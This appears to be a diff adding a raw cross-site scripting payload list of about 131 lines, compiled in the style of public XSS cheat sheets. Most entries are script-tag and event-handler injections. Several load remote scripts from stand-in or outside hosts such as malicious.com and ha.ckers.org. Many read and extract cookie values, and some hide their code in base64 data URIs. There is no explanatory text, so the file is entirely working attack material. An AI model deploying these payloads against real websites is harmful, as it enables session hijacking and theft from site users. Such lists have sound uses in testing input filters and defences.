@@ -1,0 +1,131 @@
+<script>document.location='javascript:alert("DOM-based XSS")'</script>
+"><script>document.location='javascript:alert("DOM-based XSS")'</script>
+<svg><script>alert('XSS')</script></svg>
+<script>alert('XSS');</script>
+"><script>alert('XSS')</script>
+<input type="text" value='"><script>alert(1)</script>'>
+<script>document.body.appendChild(document.createElement('script')).src='http://malicious.com/x.js'</script>
+<svg><script>alert('XSS')</script></svg>
+<script>document.cookie="XSS=test";alert(document.cookie)</script>
+<script>alert(1)</script>
+innerHTML=location.hash>#<script>alert(1)</script>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
+<script draggable="true" ondrag="alert(1)">test</script>
+<script draggable="true" ondragend="alert(1)">test</script>
+<script draggable="true" ondragenter="alert(1)">test</script>
+<script draggable="true" ondragleave="alert(1)">test</script>
+<script draggable="true" ondragstart="alert(1)">test</script>
+<script id=x tabindex=1 onactivate=alert(1)></script>
+<script id=x tabindex=1 onbeforeactivate=alert(1)></script>
+<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>
+<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>
+<script id=x tabindex=1 onfocus=alert(1)></script>
+<script id=x tabindex=1 onfocusin=alert(1)></script>
+<script onbeforecopy="alert(1)" contenteditable>test</script>
+<script onbeforecut="alert(1)" contenteditable>test</script>
+<script onbeforepaste="alert(1)" contenteditable>test</script>
+<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>
+<script onclick="alert(1)">test</script>
+<script oncontextmenu="alert(1)">test</script>
+<script oncopy="alert(1)" contenteditable>test</script>
+<script oncut="alert(1)" contenteditable>test</script>
+<script ondblclick="alert(1)">test</script>
+<script onerror=alert(1) src=/></script>
+<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>
+<script onkeydown="alert(1)" contenteditable>test</script>
+<script onkeypress="alert(1)" contenteditable>test</script>
+<script onkeyup="alert(1)" contenteditable>test</script>
+<script onload=alert(1) src=validjs.js></script>
+<script onmousedown="alert(1)">test</script>
+<script onmouseenter="alert(1)">test</script>
+<script onmouseleave="alert(1)">test</script>
+<script onmousemove="alert(1)">test</script>
+<script onmouseout="alert(1)">test</script>
+<script onmouseover="alert(1)">test</script>
+<script onmouseup="alert(1)">test</script>
+<script onpaste="alert(1)" contenteditable>test</script>
+<script onreadystatechange=alert(1)></script>
+<style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=alert(1)></script>
+<style>:target {color:red;}</style><script id=x style="transition:color 1s" ontransitionend=alert(1)></script>
+<style>:target {transform: rotate(180deg);}</style><script id=x style="transition:transform 2s" ontransitionrun=alert(1)></script>
+<style>@keyframes slidein {}</style><script style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></script>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style="position:absolute;" onanimationcancel="alert(1)"></script>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationend="alert(1)"></script>
+<style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
+'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
+<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
+<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
+<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
+<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
+<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
+<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
+<script>alert(document.head.innerHTML.substr(146,20));</script>
+<script>alert(document.head.childNodes[3].text)</script>
+<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
+<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
+<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
+<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
+<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
+<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
+<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
+<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
+<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
+<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
+<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
+<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
+<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
+<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
+<script src="data:text/javascript,alert(1)"></script>
+<script>+-+-1-+-+alert(1)</script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
+<SCRIPT>alert('XSS');</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<sCRIpt x=">" src=//15.rs></script>
+<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div><div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div><div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div><div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div><div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div><div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div><div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div><div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div><div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div><div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div><div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div><div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div><div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div><div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div><div id="18"><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>//["'`-->]]>]</div><div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div><div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div><div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div><div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div><div id="23"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div><div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//["'`-->]]>]</div><div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div><div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div><div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div>
+<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div><div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div>
+<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div><div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div><div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div><div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div><div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div><div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div><div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
+<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+<? foo="><script>alert(91)</script>">
+<! foo="><script>alert(91)</script>">
+</ foo="><script>alert(91)</script>">
+<? foo="><x foo='?><script>alert(91)</script>'>">
+<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
+<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
+<script>d.innerHTML+='';</script>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
+<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]</div><div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'`-->]]>]</div><div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div><div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div>
+<div id="120"><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script>
+<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+<script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>//["'`-->]]>]</div>
+<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
+<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
+<script>$=1,alert($)</script>
